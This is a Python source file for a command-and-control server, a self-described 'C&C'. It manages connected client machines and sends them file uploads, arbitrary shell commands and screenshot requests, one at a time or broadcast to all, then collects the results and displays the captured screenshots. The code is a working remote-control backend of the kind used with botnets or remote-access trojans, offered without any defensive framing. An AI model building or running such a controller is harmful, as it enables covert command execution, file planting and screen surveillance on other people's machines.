import socket
import threading
import time
import json
import os
from termcolor import colored
#for dispaly the refreshing status in sparate cli 
import subprocess
from prettytable import PrettyTable
import base64
import io
from PIL import ImageGrab , Image



# A helper class that represents a client Thread
class ClientThread(threading.Thread):
    def __init__(self, conn, address,id, server, last_alive_time):
        threading.Thread.__init__(self)
        self.id = id
        self.conn = conn
        self.address = address
        #refers to the Server instance that created the ClientThread.
        self.server = server
        self.last_alive_time = last_alive_time
        self.command_results = {}
        
        
    # Recive data from the actual client
    def _recv(self ,socket):
        data = b""
        while True:
            chunk = socket.recv(1024)
            if not chunk or b"}" in chunk:
                data += chunk
                break
            data += chunk
        try:
            deserialized = json.loads(data.decode("utf-8"))
        except (TypeError, ValueError , json.decoder.JSONDecodeError) as e:
                raise Exception('Data received was not in JSON format' + str(e))
        return deserialized
        
    #Add the result of excution to the socket's result and append it to the server command_results
    def add_result(self , command_id , excution_result):
        if command_id not in self.command_results:
            self.command_results[command_id] = []  
            # add the command result to the ClientTread list by key command_id
        self.command_results[command_id].append(excution_result)
        # update the command_results list of ClientTread by key command_id
        self.server.add_client_command_result(command_id ,self.id , self.command_results)
        print(colored(f'Received result for command {self.server.COMMANDS[command_id]} from client {self.id} \n' , 'green'))
        self.server.data_received.set()
            

    def run(self):
        print(colored("New client connected at time: {} with ID {}".format(self.last_alive_time ,self.id),"green"))
        #add a new client thread to the list of active client threads being handled by the server.
        self.server.add_client_thread(self)
        while self.server.running:
            message = self._recv(self.conn)
            if not message:
                return
            type = message["command_type"]
            if type == "exit":
                break
            if type == 'keep_alive':
                self.last_alive_time = time.time()
                continue
            else:
                command_id = message["command_id"]
                # print(command_id)
                result = message["command_result"]
            if result:
                if type == "screenshot":
                    excution_result = base64.b64decode(result.encode('utf-8'))
                    img_bytes = io.BytesIO(excution_result)
                    img = Image.open(img_bytes)
                    img.show()
                    self.add_result(command_id ,excution_result)
                else:
                    print(result)
                    self.add_result(command_id ,result)
        self.conn.close()
        self.server.remove_client_thread(self.id)
      
       
        
        
        

# Server class
class Server:
    def __init__(self, host, port,refresh_interval):
        self.host = host
        self.port = port
        self.commands_dir = os.path.join(os.getcwd(),"commands_dir")
        self.command_results = {}
        self.command_results_lock = threading.Lock()
        self.client_threads = {} #list of connected clients
        self.client_threads_lock = threading.Lock()
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.refresh_interval = refresh_interval
        self.running = True #indicate if the operator exiting the serevr
        self.have_conn =False # indicate if the self.client_threads has at list one client connected to operat on
        self.exit = {"command_type" :"exit"} # sending this message  in case want close the client socket
        self.command_running_event = threading.Event()
        self.command_running_event.clear()  # set to False initially
        self.data_received = threading.Event()  # Create a threading.Event() for self.command_thread to wait until the data is recived
        
        

        #Command options for the operator to choose from
        self.OPERATION = {
            1: 'Send Command',
            2: 'Remove/Kill Client',
            3: 'Display Command Result',
            4: 'Exit'
        }

        # Submenue options for choosing a command to send
        self.SUBMENUE_OPTIONS = {
            1: 'Single Client',
            2: 'Broadcast',
        }
        
        # Options of commaand sending
        self.COMMANDS = {
            1: "file_upload",
            2: "shell_exec",
            3: "screenshot"}

        #starting the server
        self.start()
        

#Start the server
    def start(self):
        print(colored(f"Listening on {self.host}:{self.port}", "green"))
        self.command_thread = threading.Thread(target=self.handle_commands)
        self.command_thread.start()
        # refresh_thread = threading.Thread(target=self.refresh_status, args=(self.refresh_interval,))
        # refresh_thread.daemon = True  # make sure the thread stops when the program exits
        # refresh_thread.start()
        client_thread = threading.Thread(target=self.listen_for_clients)
        client_thread.start()

        
        while self.running:
            #Listening and accept new clients  
            try:
                if self.have_conn:
                    self.handle_commands()
            except KeyboardInterrupt:
                print("Shutting down server...")
                self.stop()
                break
        self.command_thread.join()
        self.server_socket.close()
        self.stop()
    

    def listen_for_clients(self):
         while self.running:
            try:
                conn, addr = self.server_socket.accept()
                with self.client_threads_lock:
                    client_id = len(self.client_threads) + 1
                client_thread = ClientThread(conn, addr, client_id, self ,time.time())
                client_thread.start()
            except socket.error:
                pass

        
#Stop the server        
    def stop(self):
        self.running = False
        self.kill_all_clients()
        self.client_threads = {}
        if self.server_socket is not None:
            self.server_socket.close()
            self.server_socket = None
        print("Server stopped")
            
#Handles user input and executes commands for the server.
    def handle_commands(self): 
        # indicate that the command function is running
         
        
        while self.running:
            self.data_received.clear()
            if not self.have_conn:
                print(colored("There are no clients connected", "red"))
                return
                
            # Display operation options
            operation = self.operation_options()
            
            # Exit - close server operation
            if operation == 4:
                print("Exiting...")
                self.running = False
                break

            # If not Exit can continue to the submenu
            submenue_option =self.submenue_options()

            # Send command operation
            if operation == 1:
                cmd = self.command_options()
                command_to_send = self.generate_cmd( self.COMMANDS[cmd] , cmd)

            # Broadcast command to all connected clients
                if submenue_option == 2:
                    with self.client_threads_lock:
                        clients = dict(self.client_threads)
                    for client_id in clients:
                        self.send_cmd(client_id, command_to_send, cmd)
                    self.data_received.wait()
                    
                            
                # Send command to a single client
                else:
                    client_id = self.choose_client()
                    self.send_cmd(client_id, command_to_send, cmd)
                    self.data_received.wait()
                        
                        
            # Kill/remove client operation
            elif operation == 2:
                # Broadcast kill command to all connected clients
                if submenue_option == 2:
                    self.kill_all_clients()

                else:
                    client_id = self.choose_client()
                    with self.client_threads_lock:
                        target = self.client_threads[client_id]
                    self.kill_client(target)
                    self.data_received.wait()

            # Display command result operation
            elif operation == 3:
                # Display all command results for all connected clients
                if submenue_option == 2:
                        self.display_cmd_result_broadcast()
                # Display command result for a single client
                else:
                    client_id = self.choose_client()
                    self.display_cmd_result_single(int(client_id))

            # print(colored("Displays status:" , "green"))
            # self.command_running_event.clear()
            # self.refresh_status(5)
            # self.command_running_event.set()
            
           

            
        
 
#Add or updates if already existing results, 
#command execution of a certain ClientThread according to command ID and ClientThread ID
    def add_client_command_result(self, command_id ,client_thread_id , cmd_result_list):
        with self.command_results_lock:
            if command_id not in self.command_results:
                 self.command_results[command_id] = {}
            self.command_results[command_id][client_thread_id] = cmd_result_list

#Add ClientThread to client_threads list
    def add_client_thread(self, client_thread):
        with self.client_threads_lock:
            self.client_threads[client_thread.id] = client_thread
        self.have_conn = True
        
#Remove ClientThread from client_threads list
    def remove_client_thread(self, client_id):
        with self.client_threads_lock:
            del self.client_threads[client_id]
        if len(self.client_threads) == 0:
           self.have_conn = False
        print("Client disconnected: {}".format(client_id))
        self.data_received.set()
        

        
        
         
 
#Display operator options and take choosen operation as input
    def operation_options(self):
        print(colored("Choose operation:", "yellow"))
        for (key, value) in enumerate(self.OPERATION.items()):
            print(colored("{}) {}".format(key, value),"cyan"))
        choice = self.input_operator(len(self.OPERATION))
        return choice

#Display submenu options Single client/Broadcast  and take choosen option as input
    def submenue_options(self):
        print(colored("Choose option:", "yellow"))
        for (key, value) in enumerate(self.SUBMENUE_OPTIONS.items()):
            print(colored("{}) {}".format( key, value),"cyan"))
        choice = self.input_operator(len(self.SUBMENUE_OPTIONS))
        return choice

#Display commands options Single  and take choosen command as input
    def command_options(self):
        print(colored("Choose command:", "yellow"))
        for  (key, value) in enumerate(self.COMMANDS.items()):
            print(colored("{}) {}".format( key, value),"cyan"))
        choice = self.input_operator(len(self.COMMANDS))
        return choice

#Display the connected clients and take choosen clients as input
    def choose_client(self):
        with self.client_threads_lock:
            print(colored("Choose a client:" , "yellow"))
            for i, ( client_id ,client_thread) in enumerate(self.client_threads.items()):
                print(colored("{}) {}".format(client_id ,client_thread.id), "cyan"))

            curr_num_of_conn =len(self.client_threads)
            choice = self.input_operator(curr_num_of_conn)
            keys = list(self.client_threads.keys())
            if len(keys) > 0:
                choice = (self.client_threads[keys[int(choice)-1]])
            else:
                print(colored("Empty dictionary. Try again.", "red"))
                return
        return int(choice.id)

#Take valid input     
    def input_operator(self, range):
        while True:
            print(colored("Enter choice [1-{}]: ".format(range), "yellow"))
            choice = input(colored(">>> ", "blue"))
            if choice.isdigit() and int(choice) >= 1 and int(choice) <= range:
                return int(choice)
            else:
                print(colored("Invalid choice. Try again.", "red"))

#Generate command payload from dir acoording to the selected command , return json of the command to send
    def generate_cmd(self, command_type, command_id):

        # get the path to the payload of the selected command
        filepath = os.path.join(self.commands_dir, f"{command_type}.py")

        # Read the contents of the Python file into a string
        with open(filepath, "r") as f:
            command_payload = f.read()
        try:
            command_args = self.process_arguments(command_id)
        except Exception as e:
                print(f'Error: {str(e)}')

        # Initialized the command values
        command = {
            "command_payload_path": command_payload,
            "command_type": command_type,
            "command_id": command_id,
            "command_args": command_args
        }
        return command
    
#Take valid arguments input
    def process_arguments(self , command_id):
        processed_arguments = []
        #case it upload_file
        if command_id == 1:
            self.upload_args(processed_arguments)
        elif command_id == 2:
            self.shell_exc_args(processed_arguments)
        return processed_arguments

    
#Handle file_upload args
    def upload_args(self ,processed_arguments):
        print(colored("Enter file path: \n" ,"yellow"))
        while True:
            input_str = input(colored(">>>" , "blue"))
            try:
                with open(input_str.strip('"'), 'rb') as f:
                    file_content = f.read()
                break
            except:
                print(colored("The file is not found, Try again.", "red"))
        encoded_file_content = base64.b64encode(file_content)
        processed_arguments.append(encoded_file_content.decode('utf-8'))
        print(colored("Enter file name or destenation with a suffix : \n" ,"yellow"))
        name = input(colored(">>>" , "blue"))
        processed_arguments.append(name)

#Handle shell excution args
    def shell_exc_args(self , processed_arguments):
       print(colored("Enter shell command like dir / cd and etc...: \n" ,"yellow"))
       while True:
                input_str = input(colored(">>>" , "blue"))
                try:
                    subprocess.run(input_str, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    break
                except subprocess.CalledProcessError as e:
                    print(colored(f"Your input must be a shell command {e}, Try again.", "red")) 
       processed_arguments.append(input_str.split())

#Send data to the client    
    def _send(self, socket, data):
        try:
            serialized = json.dumps(data)
        except (TypeError, ValueError):
            raise Exception('You can only send JSON-serializable data')
        encoded_data = serialized.encode('utf-8')
        socket.conn.sendall(encoded_data)
        # self.data_received.wait()
       
        
        
#Sending command_msg to client with id client_id
    def send_cmd(self, client_id, command_msg, command_id):
        with self.client_threads_lock:
            if client_id not in self.client_threads:
                print(colored("Invalid client ID", "red"))
                return
            target = self.client_threads[client_id]
        print(colored(f'Sent command {self.COMMANDS[command_id]} to client {client_id} \n',"green"))
        self._send(target ,command_msg )
        
       

#Kill client
    def kill_client(self , client):
        # Wait for the threading.Event() object
        self._send(client , self.exit)
        

#Kill all the clients
    def kill_all_clients(self):
        with self.client_threads_lock:
            clients = dict(self.client_threads)
        for client_id in clients:
                self.kill_client(self.client_threads[client_id])
        self.data_received.wait()
        
        
#Display the command results for all connected clients.
    def display_cmd_result_broadcast(self):
        d ={}
        i =1
        with self.command_results_lock:
            if not bool(self.command_results):
                print(colored("Results not found", "red"))
                return
            print(colored("Choose a command:" , "yellow"))
            for cmd_id  in self.command_results:
                print(colored("{}) {}".format(i ,self.COMMANDS[cmd_id]), "cyan"))
                d[i] = cmd_id
                i+=1
            cmd = self.input_operator(len(self.command_results))
            choice = (d[cmd])
            print(colored("Result:","cyan"))
            for client_id in self.command_results[int(choice)]:
                print(colored(str(self.command_results[int(choice)][client_id]), "cyan"))


#Display the command results for single client.
    def display_cmd_result_single(self , client_id):
        with self.client_threads_lock:
            target = self.client_threads[client_id]
        if not bool(target.command_results):
            print(colored("Results not found", "red"))
            return
        else:
            for r in target.command_results:
                print(colored(f" the result of command with id {r} is:" , "cyan"))
                print(colored(f"{target.command_results[r]}:" , "cyan"))
           

#Refresh CLI that display status
    def refresh_status(self, interval):

        while self.running:
            # if not self.command_running_event.is_set:
                # os.system('cls' if os.name == 'nt' else 'clear')
                with self.client_threads_lock:
                    # num_clients = len(self.client_threads)
                    table = PrettyTable()
                    table.field_names = ["Client ID", "Address" ,"Port", "Last Alive Time"]
                    for thread in self.client_threads:
                        client = self.client_threads[thread]
                        table.add_row([client.id, client.conn.getpeername()[0],client.conn.getpeername()[1],client.last_alive_time])
                    status_str = f"C&C Status: Running \nConnected Clients:\n{table}\n"
                print(status_str)
                
                # subprocess.call(['start', 'C:\\Windows\\System32\\cmd.exe', '/c', 'echo', status_str])
                time.sleep(interval)
                break
                # self.command_running_event.set()
                
                

SERVER_IP = '127.0.0.1'
SERVER_PORT = 44444

s = Server(SERVER_IP , SERVER_PORT, 10)

            
           
        